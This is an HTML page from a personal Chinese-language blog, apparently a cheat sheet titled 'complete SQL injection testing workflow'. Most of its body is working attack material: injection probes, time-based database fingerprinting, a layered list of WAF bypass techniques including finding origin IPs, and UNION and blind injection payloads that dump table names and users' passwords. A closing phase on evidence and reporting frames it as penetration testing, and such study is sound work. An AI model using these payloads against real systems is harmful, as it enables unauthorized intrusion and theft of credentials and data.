@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/203419789?s=400&u=30cf849564b372e84e2c69ef269a172bf10a9bb1&v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="<html>
+<body>
+<!--StartFragment--><!DOCTYPE html><h1 cid='n0' mdtype='heading' class='md-end-block md-heading md-focus' style='box-sizing: border-box; white-space: pre-wrap; break-after: avoid-page; break-inside: avoid; orphans: 4; font-size: 2.25em; margin-top: 1rem; margin-bottom: 1rem; position: relative; font-weight: bold; line-height: 1.2; cursor: text; border-bottom: 1px solid rgb(238, 238, 238); color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Segoe UI Emoji&quot;, &quot;SF Pro&quot;, sans-serif; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><span md-inline='plain' class='md-plain md-expand' style='box-sizing: border-box;'>SQL 注入测试完整流程</span></h1><pre class='md-fences md-end-block ty-contain-cm modeLoaded' spellcheck='false' lang='' cid='n2' mdtype='fences' style='box-sizing: border-box; overflow: visible; font-family: var(--monospace); font-size: 0.9em; display: block; break-inside: avoid; text-align: left; white-space: pre; background-image: inherit; background-position: inherit; background-size: inherit; background-repeat: inherit; background-attachment: inherit; background-origin: inherit; background-clip: inherit; background-color: rgb(248, 248, 248); position: relative; border: 1px solid rgb(231, 234, 237); border-radius: 3px; padding: 8px 4px 6px; margin-bottom: 15px; margin-top: 15px; width: inherit; color: rgb(51, 51, 51); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><span role='presentation' style='box-sizing: border-box; padding-right: 0.1px;'>Phase 1 ──→ Phase 2 ──→ Phase 3 ──→ Phase 4 ──→ Phase 5</span><br><span role='presentation' style='box-sizing: border-box; padding-right: 0.1px;'>  侦察 &nbsp; &nbsp; &nbsp; &nbsp; 探测 &nbsp; &nbsp; &nbsp; &nbsp; 确认 &nbsp; &nbsp; &nbsp; &nbsp;  利用 &nbsp; &nbsp; &nbsp; &nbsp;  报告</span></pre><div tabindex='-1' cid='n3' mdtype='hr' class='md-hr md-end-block' style='box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Segoe UI Emoji&quot;, &quot;SF Pro&quot;, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><hr style='box-sizing: content-box; height: 2px; margin: 16px 0px; border: 0px none; padding: 0px; background-color: rgb(231, 231, 231); overflow: hidden;'></div><h2 cid='n4' mdtype='heading' class='md-end-block md-heading' style='box-sizing: border-box; white-space: pre-wrap; break-after: avoid-page; break-inside: avoid; orphans: 4; font-size: 1.75em; margin-top: 1rem; margin-bottom: 1rem; position: relative; font-weight: bold; line-height: 1.225; cursor: text; border-bottom: 1px solid rgb(238, 238, 238); color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Segoe UI Emoji&quot;, &quot;SF Pro&quot;, sans-serif; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><span md-inline='plain' class='md-plain' style='box-sizing: border-box;'>Phase 1 · 侦察（信息收集，不发包）</span></h2><p cid='n5' mdtype='paragraph' class='md-end-block md-p' style='box-sizing: border-box; line-height: inherit; orphans: 4; margin: 0.8em 0px; white-space: pre-wrap; position: relative; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Segoe UI Emoji&quot;, &quot;SF Pro&quot;, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><span md-inline='plain' class='md-plain' style='box-sizing: border-box;'>先看懂目标，别盲目上 payload。">
+<meta property="og:title" content="SQL 注入测试完整流程">
+<meta property="og:description" content="<html>
+<body>
+<!--StartFragment--><!DOCTYPE html><h1 cid='n0' mdtype='heading' class='md-end-block md-heading md-focus' style='box-sizing: border-box; white-space: pre-wrap; break-after: avoid-page; break-inside: avoid; orphans: 4; font-size: 2.25em; margin-top: 1rem; margin-bottom: 1rem; position: relative; font-weight: bold; line-height: 1.2; cursor: text; border-bottom: 1px solid rgb(238, 238, 238); color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Segoe UI Emoji&quot;, &quot;SF Pro&quot;, sans-serif; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><span md-inline='plain' class='md-plain md-expand' style='box-sizing: border-box;'>SQL 注入测试完整流程</span></h1><pre class='md-fences md-end-block ty-contain-cm modeLoaded' spellcheck='false' lang='' cid='n2' mdtype='fences' style='box-sizing: border-box; overflow: visible; font-family: var(--monospace); font-size: 0.9em; display: block; break-inside: avoid; text-align: left; white-space: pre; background-image: inherit; background-position: inherit; background-size: inherit; background-repeat: inherit; background-attachment: inherit; background-origin: inherit; background-clip: inherit; background-color: rgb(248, 248, 248); position: relative; border: 1px solid rgb(231, 234, 237); border-radius: 3px; padding: 8px 4px 6px; margin-bottom: 15px; margin-top: 15px; width: inherit; color: rgb(51, 51, 51); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><span role='presentation' style='box-sizing: border-box; padding-right: 0.1px;'>Phase 1 ──→ Phase 2 ──→ Phase 3 ──→ Phase 4 ──→ Phase 5</span><br><span role='presentation' style='box-sizing: border-box; padding-right: 0.1px;'>  侦察 &nbsp; &nbsp; &nbsp; &nbsp; 探测 &nbsp; &nbsp; &nbsp; &nbsp; 确认 &nbsp; &nbsp; &nbsp; &nbsp;  利用 &nbsp; &nbsp; &nbsp; &nbsp;  报告</span></pre><div tabindex='-1' cid='n3' mdtype='hr' class='md-hr md-end-block' style='box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Segoe UI Emoji&quot;, &quot;SF Pro&quot;, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><hr style='box-sizing: content-box; height: 2px; margin: 16px 0px; border: 0px none; padding: 0px; background-color: rgb(231, 231, 231); overflow: hidden;'></div><h2 cid='n4' mdtype='heading' class='md-end-block md-heading' style='box-sizing: border-box; white-space: pre-wrap; break-after: avoid-page; break-inside: avoid; orphans: 4; font-size: 1.75em; margin-top: 1rem; margin-bottom: 1rem; position: relative; font-weight: bold; line-height: 1.225; cursor: text; border-bottom: 1px solid rgb(238, 238, 238); color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Segoe UI Emoji&quot;, &quot;SF Pro&quot;, sans-serif; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><span md-inline='plain' class='md-plain' style='box-sizing: border-box;'>Phase 1 · 侦察（信息收集，不发包）</span></h2><p cid='n5' mdtype='paragraph' class='md-end-block md-p' style='box-sizing: border-box; line-height: inherit; orphans: 4; margin: 0.8em 0px; white-space: pre-wrap; position: relative; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Segoe UI Emoji&quot;, &quot;SF Pro&quot;, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><span md-inline='plain' class='md-plain' style='box-sizing: border-box;'>先看懂目标，别盲目上 payload。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://mhwangdex.github.io/post/SQL%20-zhu-ru-ce-shi-wan-zheng-liu-cheng.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/203419789?s=400&u=30cf849564b372e84e2c69ef269a172bf10a9bb1&v=4">
+<title>SQL 注入测试完整流程</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">SQL 注入测试完整流程</h1>
+<div class="title-right">
+    <a href="https://mhwangdex.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/mhwangdex/mhwangdex.github.io/issues/33" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody">
+
+<h1><span>SQL 注入测试完整流程</span></h1><pre lang="" class="notranslate"><span>Phase 1 ──→ Phase 2 ──→ Phase 3 ──→ Phase 4 ──→ Phase 5</span><br><span>  侦察         探测         确认          利用          报告</span></pre><div tabindex="-1"><hr></div><h2><span>Phase 1 · 侦察（信息收集，不发包）</span></h2><p><span>先看懂目标，别盲目上 payload。</span></p><pre lang="" class="notranslate"><span>目标URL/参数</span><br><span>    │</span><br><span>    ├─ 看后缀：.asp → ASP/Access/MSSQL</span><br><span>    │            .aspx → ASP.NET/MSSQL</span><br><span>    │            .php → PHP/MySQL</span><br><span>    │            .jsp → Java/Oracle/MySQL</span><br><span>    │            .js → API (JSON)</span><br><span>    │</span><br><span>    ├─ 看Cookie：ASPSESSIONID → 经典ASP</span><br><span>    │              ASP.NET_SessionId → ASP.NET</span><br><span>    │              PHPSESSID → PHP</span><br><span>    │              JSESSIONID → Java</span><br><span>    │</span><br><span>    ├─ 看编码：charset=gbk → 可能有宽字节注入</span><br><span>    │</span><br><span>    └─ 看服务器头：Server: *** 隐藏 → 云WAF</span><br><span>                     Server: Microsoft-IIS → Windows</span><br><span>                     Server: nginx → Linux反代</span></pre><div tabindex="-1"><hr></div><h2><span>Phase 2 · 注入点探测（发 payload 试反应）</span></h2><h3><span>Step 2.1 建立基线</span></h3><pre lang="" class="notranslate"><span>参数=正常值</span><br><span>     └─ 记录：HTTP状态码、响应大小、响应内容、响应时间</span></pre><h3><span>Step 2.2 塞特殊字符</span></h3><pre lang="" class="notranslate"><span>参数=正常值'</span><br><span>     ├─ HTTP 500 / 错误页 / SQL语法错误</span><br><span>     │   └─ → 怀疑注入，进 Phase 2.3</span><br><span>     │</span><br><span>     ├─ HTTP 200，但内容/大小和正常一样</span><br><span>     │   └─ → 可能被转义或过滤，试宽字节：参数=%df'</span><br><span>     │</span><br><span>     ├─ curl: (52) Empty reply</span><br><span>     │   └─ → WAF拦截，进 Phase 3 WAF绕过</span><br><span>     │</span><br><span>     └─ HTTP 200，改变了页面数据</span><br><span>         └─ → 可能是数字型，试：参数-0 和 参数-1 看有无差异</span></pre><h3><span>Step 2.3 闭合确认（用注释修复）</span></h3><pre lang="" class="notranslate"><span>参数=1'--</span><br><span>     ├─ HTTP 200（恢复正常）→ 单引号闭合，进 Phase 2.4</span><br><span>     │</span><br><span>     ├─ 还是500 → 试其他闭合：</span><br><span>     │   参数=1"--       （双引号）</span><br><span>     │   参数=1')--      （带括号）</span><br><span>     │   参数=1"))--     （多层括号）</span><br><span>     │   参数=1' #       （MySQL的#注释）</span><br><span>     │</span><br><span>     └─ 还是不行？→ 可能是数字型，试：</span><br><span>        参数=1 AND 1=1   比  参数=1 AND 1=2   看有差异吗？</span></pre><h3><span>Step 2.4 判断数据库类型</span></h3><pre lang="" class="notranslate"><span>参数=1' AND 1=1--</span><br><span>     ├─ 200 → 继续（MySQL/MSSQL/PG/Oracle）</span><br><span>     ├─ 空或异常 → 关键字被拦，换方式：</span><br><span>     │   参数=1' /*!50000AND*/ 1=1--   (MySQL注释绕过)</span><br><span>     │   参数=1' %26%26 1=1--          (&amp; &amp; 绕过，需URL编码)</span><br><span>     │   参数=1' AND 1=1--             (无空格)</span><br><span>     └─ 如果以上全部Empty reply → WAF，进Phase3</span><br><span><span>​</span></span><br><span>同时判断数据库：</span><br><span>     参数=1' AND '1'='1     (字符型探测)</span><br><span>     参数=1' WAITFOR DELAY '0:0:5'--</span><br><span>         ├─ 延时5秒 → MSSQL ✅</span><br><span>         │</span><br><span>     参数=1' AND SLEEP(5)--</span><br><span>         ├─ 延时5秒 → MySQL/PG ✅</span><br><span>         │</span><br><span>     参数=1' AND pg_sleep(5)--</span><br><span>         ├─ 延时5秒 → PostgreSQL ✅</span><br><span>         │</span><br><span>     参数=1' AND dbms_pipe.receive_message('a',5)=1--</span><br><span>         ├─ 延时5秒 → Oracle ✅</span><br><span>         │</span><br><span>     参数=1'/**/iif(1=1,1,0)=1</span><br><span>         └─ 成功 → Access</span></pre><div tabindex="-1"><hr></div><h2><span>Phase 3 · WAF 绕过（如果被拦）</span></h2><pre lang="" class="notranslate"><span>被WAF拦了怎么办→ 按这个顺序试：</span><br><span><span>​</span></span><br><span>第一层：编码层（最便宜）</span><br><span>    ├─ 大小写：UnIoN SeLeCt</span><br><span>    ├─ 注释插入：UN/**/ION SEL/**/ECT</span><br><span>    ├─ 双写：UNUNIONION SELSELECTECT</span><br><span>    ├─ URL编码：%55%4e%49%4f%4e</span><br><span>    ├─ 双重编码：%2555%254e...（WAF解码一次%25→%，后端再解一次）</span><br><span>    └─ GKB宽字节：%df' 吃掉转义反斜杠</span><br><span><span>​</span></span><br><span>第二层：语义层</span><br><span>    ├─ 关键字替换：AND→&amp;&amp;  OR→||  1=1→1 LIKE 1</span><br><span>    ├─ 等号替换：= → LIKE / IN / BETWEEN / REGEXP</span><br><span>    ├─ 空格替换：/**/  %09  %0a  %0d  %0b  %0c  括号嵌套</span><br><span>    └─ 函数替换：substring()→mid()→substr()→left()</span><br><span><span>​</span></span><br><span>第三层：协议层（更底层）</span><br><span>    ├─ HPP参数污染：?id=1&amp;id=UNION&amp;id=SELECT&amp;id=1,2,3</span><br><span>    ├─ Transfer-Encoding: chunked（分块发，关键字拆到不同块）</span><br><span>    ├─ Content-Type: multipart/form-data（绕过表单检测）</span><br><span>    ├─ HTTP方法覆盖：POST改PUT，或X-HTTP-Method-Override</span><br><span>    ├─ 超长参数填充：填充5000+字节垃圾溢出WAF缓冲区</span><br><span>    └─ 换入口：Cookie / Header / User-Agent / Referer / XFF</span><br><span><span>​</span></span><br><span>第四层：架构层</span><br><span>    ├─ 找源站IP：绕过云WAF直接打（fofa/censys/historical DNS）</span><br><span>    ├─ 找同站不同子域（可能有不同WAF规则）</span><br><span>    └─ 找无WAF的旧版接口（/api/v1/  vs  /api/v2/）</span></pre><div tabindex="-1"><hr></div><h2><span>Phase 4 · 利用（注出数据）</span></h2><h3><span>Step 4.1 探字段数</span></h3><pre lang="" class="notranslate"><span>优先试 ORDER BY（几乎所有数据库都支持）：</span><br><span>    参数=1' ORDER BY 1--</span><br><span>    参数=1' ORDER BY 2--</span><br><span>    参数=1' ORDER BY 3--</span><br><span>    ... 直到报错，N-1就是字段数</span><br><span><span>​</span></span><br><span>    备选（怕ORDER关键字被拦）：</span><br><span>    参数=-1' UNION SELECT NULL--</span><br><span>    参数=-1' UNION SELECT NULL,NULL--</span><br><span>    参数=-1' UNION SELECT NULL,NULL,NULL--</span><br><span>    ... 直到不报错，NULL的个数 = 字段数</span></pre><h3><span>Step 4.2 判断回显位</span></h3><pre lang="" class="notranslate"><span>参数=-1' UNION SELECT 1,2,3,4--</span><br><span>    └─ 看页面上哪个数字显示出来了</span><br><span>        ├─ 显示 1 → 第1列是回显位</span><br><span>        ├─ 显示 2 → 第2列是回显位</span><br><span>        └─ 什么都没显示 / 0条结果 → UNION不回显，走盲注</span></pre><h3><span>Step 4.3a 有回显 → UNION注入</span></h3><pre lang="" class="notranslate"><span>参数=-1' UNION SELECT 1,database(),version(),4--</span><br><span>参数=-1' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables--</span><br><span>参数=-1' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--</span><br><span>参数=-1' UNION SELECT 1,username,password,4 FROM users--</span></pre><h3><span>Step 4.3b 无回显 → 盲注</span></h3><pre lang="" class="notranslate"><span>布尔盲注（有条件差异）：</span><br><span>    参数=1' AND (SELECT LEN(password) FROM users WHERE id=1) &gt; 5--</span><br><span>    └─ 比较页面差异逐字推断</span><br><span><span>​</span></span><br><span>时间盲注（无条件差异）：</span><br><span>    参数=1' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))&gt;97, SLEEP(3), 0)--</span><br><span>    └─ 靠延时逐字推断</span><br><span><span>​</span></span><br><span>报错注入（MSSQL特有）：</span><br><span>    参数=1' AND 1=CONVERT(INT, (SELECT @@version))--</span><br><span>    └─ 错误信息里返回查询结果</span></pre><div tabindex="-1"><hr></div><h2><span>Phase 5 · 取证与报告</span></h2><pre lang="" class="notranslate"><span>确认漏洞后记录：</span><br><span><span>​</span></span><br><span>1. HTTP请求包（完整抓包，包含Header和Body）</span><br><span>2. 证明注入的对比证据：</span><br><span>    正常请求    → 响应</span><br><span>    注入成功后  → 响应（内容变化/时间差/报错信息）</span><br><span>3. 至少复现3次（证明不是偶然）</span><br><span>4. 输出报告：</span><br><span>    漏洞名称</span><br><span>    影响参数</span><br><span>    数据库类型/版本</span><br><span>    能读取的表和数据</span><br><span>    CVSS评分</span></pre><div tabindex="-1"><hr></div><h2><span>速查卡（一张图记住流程）</span></h2><pre lang="" class="notranslate"><span>拿目标</span><br><span>  ↓</span><br><span>参数加 ' 看报错              ← 探注入点</span><br><span>  ↓</span><br><span>加 -- 或 # 看恢复            ← 确认闭合方式</span><br><span>  ↓</span><br><span>ORDER BY / UNION NULL       ← 探字段数  </span><br><span>  ↓</span><br><span>UNION SELECT 1,2,3,4        ← 找显示位</span><br><span>  ↓</span><br><span>查库名 → 表名 → 列名 → 数据  ← 取数据</span><br><span>  ↓</span><br><span>如果以上某步被WAF拦          </span><br><span>  → 编码绕过 → 协议绕过 → 换入口 → 找源站IP</span></pre><div tabindex="-1"><hr></div><h2><span>ORDER BY 各数据库支持情况</span></h2>
+数据库 | ORDER BY | 注释 | 说明
+-- | -- | -- | --
+MySQL | ✅ | --  / # | 最常用
+MSSQL | ✅ | -- | 经典ASP常用
+Oracle | ✅ | -- | 注意 FROM DUAL
+PostgreSQL | ✅ | -- | 与MySQL类似
+Access | ✅ 但无注释 | 不支持--/# | 改用报错注入或/**/
+SQLite | ✅ | -- | 有限支持
+MongoDB | ❌ | - | NoSQL，完全不同
+<div tabindex="-1"><hr></div><h2><span>一句话总结</span></h2><pre lang="" class="notranslate"><span>探注入 → 加 ' 看报错    闭注释 → 加 -- 看恢复</span><br><span>确字段 → ORDER BY递进    看回显 → UNION SELECT 1,2,3</span><br><span>出数据 → 查库→查表→查列  被WAF拦 → 编码→协议→换入口</span></pre>
+
+</div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://mhwangdex.github.io">issalt</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if("04/16/2025"!=""){
+    var startSite=new Date("04/16/2025");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","mhwangdex/mhwangdex.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+
+
+</script>
+
+
+</html>
